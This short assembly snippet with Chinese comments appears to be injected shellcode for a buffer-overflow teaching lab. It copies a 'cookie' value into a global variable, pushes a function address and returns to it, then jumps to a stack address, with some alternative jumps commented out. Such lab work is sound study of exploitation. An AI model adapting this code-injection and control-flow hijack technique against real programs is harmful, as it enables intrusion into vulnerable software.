# ; 目前已知cookie的位置是0x804c220
# ; global values的位置为0x804c218
# ; Cookie: 0x606b1729;
# mov eax, DWORD PTR ds:0x804c220
# mov DWORD PTR ds:0x804c218, eax
# call 0x08048d05
mov 0x804c220, %eax
mov %eax, 0x804c218
push $0x08048d05
ret
# call 0x8048d05
jmp 0x55682ed1
# jmp -0xf(%ebp)
# jmp $-0x17
# jmp -0x17(%esp)
